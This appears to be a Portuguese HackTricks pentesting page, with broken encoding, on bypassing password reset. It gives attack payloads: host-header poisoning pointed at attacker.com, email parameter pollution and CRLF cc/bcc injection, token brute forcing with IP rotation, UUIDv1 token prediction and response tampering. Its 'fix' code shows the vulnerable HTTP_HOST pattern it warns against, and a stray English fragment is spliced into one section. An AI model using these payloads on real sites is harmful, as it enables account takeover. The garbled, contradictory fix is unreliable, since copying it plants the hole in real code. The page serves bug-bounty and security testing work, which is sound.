# Bypass de RedefiniÃ§Ã£o/Esquecimento de Senha

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o** [**repositÃ³rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositÃ³rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

ğŸ Leia tutoriais de bugs web3

ğŸ”” Receba notificaÃ§Ãµes sobre novos programas de recompensa por bugs

ğŸ’¬ Participe de discussÃµes na comunidade

As seguintes tÃ©cnicas de recompilaÃ§Ã£o foram retiradas de [https://anugrahsr.github.io/posts/10-Password-reset-flaws/](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)

## Vazamento de Token de RedefiniÃ§Ã£o de Senha Via Referer

O **HTTP referer** Ã© um campo de cabeÃ§alho HTTP opcional que identifica o endereÃ§o da pÃ¡gina da web que estÃ¡ vinculada ao recurso sendo solicitado. O cabeÃ§alho de solicitaÃ§Ã£o Referer contÃ©m o endereÃ§o da pÃ¡gina da web anterior a partir da qual um link para a pÃ¡gina atualmente solicitada foi seguido.

![](https://www.optimizesmart.com/wp-content/uploads/2020/01/1-1-2.jpg)

### ExploraÃ§Ã£o

* Solicite a redefiniÃ§Ã£o de senha para o seu endereÃ§o de e-mail
* Clique no link de redefiniÃ§Ã£o de senha
* NÃ£o altere a senha
* Clique em qualquer site de terceiros (por exemplo: Facebook, Twitter)
* Interceptar a solicitaÃ§Ã£o no proxy do burpsuite
* Verifique se o cabeÃ§alho referer estÃ¡ vazando o token de redefiniÃ§Ã£o de senha.

### Impacto

Isso permite que a pessoa que tem o controle de um site especÃ­fico altere a senha do usuÃ¡rio (ataque CSRF), porque essa pessoa conhece o token de redefiniÃ§Ã£o de senha do usuÃ¡rio.

### ReferÃªncia:

* https://hackerone.com/reports/342693
* https://hackerone.com/reports/272379
* https://hackerone.com/reports/737042
* https://medium.com/@rubiojhayz1234/toyotas-password-reset-token-and-email-address-leak-via-referer-header-b0ede6507c6a
* https://medium.com/@shahjerry33/password-reset-token-leak-via-referrer-2e622500c2c1

## Envenenamento de RedefiniÃ§Ã£o de Senha

Se vocÃª encontrar um ataque de cabeÃ§alho de host e estiver fora do escopo, tente encontrar o botÃ£o de redefiniÃ§Ã£o de senha!

![](https://portswigger.net/web-security/images/password-reset-poisoning.svg)

### ExploraÃ§Ã£o

* Interceptar a solicitaÃ§Ã£o de redefiniÃ§Ã£o de senha no Burpsuite
* Adicione o seguinte cabeÃ§alho ou edite o cabeÃ§alho no burpsuite (tente um por um)
```
Host: attacker.com
```

```
 Host: target.com
 X-Forwarded-Host: attacker.com
```

```
 Host: target.com
 Host: attacker.com
```
* Verifique se o link para alterar a senha dentro do e-mail estÃ¡ apontando para attacker.com

### CorreÃ§Ã£o

Use `$_SERVER['SERVER_NAME']` em vez de `$_SERVER['HTTP_HOST']`
```php
$resetPasswordURL = "https://{$_SERVER['HTTP_HOST']}/reset-password.php?token=12345678-1234-1234-1234-12345678901";
```
### Impacto

A vÃ­tima receberÃ¡ o link malicioso em seu e-mail e, ao clicar, vazarÃ¡ o link/token de redefiniÃ§Ã£o de senha do usuÃ¡rio para o atacante, levando Ã  tomada completa da conta.

### ReferÃªncia:

* https://hackerone.com/reports/226659
* https://hackerone.com/reports/167631
* https://www.acunetix.com/blog/articles/password-reset-poisoning/
* https://pethuraj.com/blog/how-i-earned-800-for-host-header-injection-vulnerability/
* https://medium.com/@swapmaurya20/password-reset-poisoning-leading-to-account-takeover-f178f5f1de87

## RedefiniÃ§Ã£o de senha manipulando o parÃ¢metro de e-mail

### ExploraÃ§Ã£o

* Adicione o e-mail do atacante como segundo parÃ¢metro usando &
```php
POST /resetPassword
[...]
email=victim@email.com&email=attacker@email.com
```
* Adicione o email do atacante como segundo parÃ¢metro usando %20
```php
POST /resetPassword
[...]
email=victim@email.com%20email=attacker@email.com
```
* Adicione o email do atacante como segundo parÃ¢metro usando |
```php
POST /resetPassword
[...]
email=victim@email.com|email=attacker@email.com
```
* Adicione o email do atacante como segundo parÃ¢metro usando cc
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```
* Adicione o email do atacante como segundo parÃ¢metro usando bcc
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
```
* Adicione o email do atacante como segundo parÃ¢metro usando ,
```php
POST /resetPassword
[...]
email="victim@mail.tld",email="attacker@mail.tld"
```
* Adicione o email do atacante como segundo parÃ¢metro no array json
```php
POST /resetPassword
[...]
{"email":["victim@mail.tld","atracker@mail.tld"]}
```
### ReferÃªncia

* https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be
* https://ninadmathpati.com/2019/08/17/how-i-was-able-to-earn-1000-with-just-10-minutes-of-bug-bounty/
* https://twitter.com/HusseiN98D/status/1254888748216655872

## Alterando o Email e a Senha de Qualquer UsuÃ¡rio por meio de ParÃ¢metros da API

### ExploraÃ§Ã£o

* O atacante deve fazer login em sua conta e ir para a funÃ§Ã£o de alteraÃ§Ã£o de senha
* Inicie o Burp Suite e intercepte a solicitaÃ§Ã£o
* ApÃ³s interceptar a solicitaÃ§Ã£o, envie-a para o repetidor e modifique os parÃ¢metros Email e Password
```php
POST /api/changepass
[...]
("form": {"email":"victim@email.tld","password":"12345678"})
```
### ReferÃªncia

* https://medium.com/@adeshkolte/full-account-takeover-changing-email-and-password-of-any-user-through-api-parameters-3d527ab27240

### Sem Limite de Taxa: Bombardeio de E-mails <a href="#5-no-rate-limiting-email-bombing" id="5-no-rate-limiting-email-bombing"></a>

### ExploraÃ§Ã£o

* Inicie o Burp Suite e intercepte a solicitaÃ§Ã£o de redefiniÃ§Ã£o de senha
* Envie para o intruder
* Use carga Ãºtil nula

### ReferÃªncia

* https://hackerone.com/reports/280534
* https://hackerone.com/reports/794395

## Descubra como o Token de RedefiniÃ§Ã£o de Senha Ã© Gerado

Descubra o padrÃ£o do token de redefiniÃ§Ã£o de senha

![](https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSvCcLcUTksGbpygrJB4III5BTBYEzYQfKJyg\&usqp=CAU)

Se ele for

* Gerado com base no Timestamp
* Gerado com base no UserID
* Gerado com base no e-mail do usuÃ¡rio
* Gerado com base no nome e sobrenome
* Gerado com base na data de nascimento
* Gerado com base em criptografia

Use o Burp Sequencer para encontrar a aleatoriedade ou previsibilidade dos tokens.

## GUID AdivinhÃ¡vel

Existem diferentes tipos de GUIDs:

* **VersÃ£o 0:** Apenas visto no GUID nulo ("00000000-0000-0000-0000-000000000000").
* **VersÃ£o 1:** O GUID Ã© gerado de maneira previsÃ­vel com base em:
  * O tempo atual
  * Uma "sequÃªncia de relÃ³gio" gerada aleatoriamente que permanece constante entre GUIDs durante o tempo de atividade do sistema gerador
  * Um "ID de nÃ³", que Ã© gerado com base no endereÃ§o MAC do sistema se estiver disponÃ­vel
* **VersÃ£o 3:** O GUID Ã© gerado usando um hash MD5 de um nome e namespace fornecidos.
* **VersÃ£o 4:** O GUID Ã© gerado aleatoriamente.
* **VersÃ£o 5:** O GUID Ã© gerado usando um hash SHA1 de um nome e namespace fornecidos.

Ã‰ possÃ­vel dar uma olhada em um GUID e descobrir sua versÃ£o, hÃ¡ uma pequena ferramenta para isso: [**guidtool**](https://github.com/intruder-io/guidtool)\*\*\*\*
```http
guidtool -i 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c
UUID version: 1
UUID time: 2021-11-17 17:52:18.141000
UUID timestamp: 138564643381410000
UUID node: 17547390002044
UUID MAC address: 0f:f5:91:f2:a3:7c
UUID clock sequence: 3426
```
Se a versÃ£o utilizada para gerar um GUID de redefiniÃ§Ã£o de senha for a versÃ£o 1, Ã© possÃ­vel realizar um ataque de forÃ§a bruta nos GUIDs:
```http
guidtool 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c -t '2021-11-17 18:03:17' -p 10000
a34aca00-47d0-11ec-8d62-0ff591f2a37c
a34af110-47d0-11ec-8d62-0ff591f2a37c
```
### ReferÃªncias

* [https://www.intruder.io/research/in-guid-we-trust](https://www.intruder.io/research/in-guid-we-trust)

## ManipulaÃ§Ã£o de resposta: Substituir uma resposta ruim por uma boa

Procure por solicitaÃ§Ãµes e respostas como estas
```php
HTTP/1.1 401 Unauthorized
(â€œmessageâ€:â€unsuccessfulâ€,â€statusCode:403,â€errorDescriptionâ€:â€Unsuccessfulâ€)
```
# Reset Password

## Description
This page will describe some techniques to reset passwords in different scenarios.

## Change Response
## DescriÃ§Ã£o
Esta pÃ¡gina descreverÃ¡ algumas tÃ©cnicas para redefinir senhas em diferentes cenÃ¡rios.
```php
HTTP/1.1 200 OK
(â€œmessageâ€:â€successâ€,â€statusCode:200,â€errorDescriptionâ€:â€Successâ€)
```
### ReferÃªncia

* https://medium.com/@innocenthacker/how-i-found-the-most-critical-bug-in-live-bug-bounty-event-7a88b3aa97b3

### Usando Token Expirado <a href="#8-using-expired-token" id="8-using-expired-token"></a>

* Verifique se o token expirado pode ser reutilizado.

### ForÃ§a Bruta no Token de RedefiniÃ§Ã£o de Senha <a href="#9-brute-force-password-rest-token" id="9-brute-force-password-rest-token"></a>

Tente fazer forÃ§a bruta no token de redefiniÃ§Ã£o de senha usando o Burpsuite.
```php
POST /resetPassword
[...]
email=victim@email.com&code=$BRUTE$
```
* Use o IP-Rotator no burpsuite para burlar o limite de taxa baseado em IP.

### ReferÃªncia

* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

### Tente Usar Seu Token <a href="#10-try-using-your-token" id="10-try-using-your-token"></a>

* Tente adicionar o token de redefiniÃ§Ã£o de senha com a conta da vÃ­tima.
```php
POST /resetPassword
[...]
email=victim@email.com&code=$YOUR_TOKEN$
```
### ReferÃªncia

* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

## InvalidaÃ§Ã£o de SessÃ£o no Logout/Reset de Senha

Quando um usuÃ¡rio faz **logout ou reseta sua senha**, a sessÃ£o atual deve ser invalidada.\
Portanto, **capture os cookies** enquanto o usuÃ¡rio estÃ¡ logado, faÃ§a **logout** e **verifique** se os **cookies** ainda estÃ£o **vÃ¡lidos**.\
Repita o processo **alterando a senha** em vez de fazer logout.

## Tempo de ExpiraÃ§Ã£o do Token de Reset

Os **tokens de reset devem ter um tempo de expiraÃ§Ã£o**, apÃ³s o qual o token nÃ£o deve ser vÃ¡lido para alterar a senha de um usuÃ¡rio.

## VerificaÃ§Ãµes Extras

* Use username@burp\_collab.net e analise o retorno
* Usar carbon copy email=victim@mail.com%0a%0dcc:hacker@mail.com
* Senha longa (>200) leva a DoS
* Adicione um segundo parÃ¢metro de email e valor

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

ğŸ Leia tutoriais de bugs web3

ğŸ”” Receba notificaÃ§Ãµes sobre novas recompensas por bugs

ğŸ’¬ Participe de discussÃµes na comunidade

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o** [**repositÃ³rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositÃ³rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
